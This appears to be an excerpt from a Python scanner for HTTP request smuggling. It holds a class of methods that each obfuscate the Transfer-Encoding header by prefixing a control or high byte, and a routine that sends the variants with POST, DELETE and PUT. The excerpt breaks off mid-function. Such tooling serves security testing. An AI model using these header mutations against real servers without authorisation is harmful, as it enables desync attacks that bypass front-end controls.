...
class attackMethod:
    ...
    def prefix1_0( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(0)+'Transfer-Encoding: ' )
        return msg
    def prefix1_1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(1)+'Transfer-Encoding: ' )
        return msg
            
    def prefix1_9( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(9)+'Transfer-Encoding: ' )
        return msg
    def prefix1_11( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(11)+'Transfer-Encoding: ' )
        return msg
    def prefix1_12( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(12)+'Transfer-Encoding: ' )
        return msg
    def prefix1_13( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(13)+'Transfer-Encoding: ' )
        return msg
    def prefix1_15( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(15)+'Transfer-Encoding: ' )
        return msg            
    def prefix1_127( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(127)+'Transfer-Encoding: ' )
        return msg
    def prefix1_160( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(160)+'Transfer-Encoding: ' )
        return msg
    def prefix1_255( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', chr(255)+'Transfer-Encoding: ' )
        return msg
...
def testURL( url ):
    ...
    base_message1 = base_message.replace('POST','DELETE')
    base_message2 = base_message.replace('POST','PUT')
    testHTTPverb(url,base_message)
    testHTTPverb(url,base_message1)
    testHTTPverb(url,base_message2)


def testHTTPverb(url, base_message):
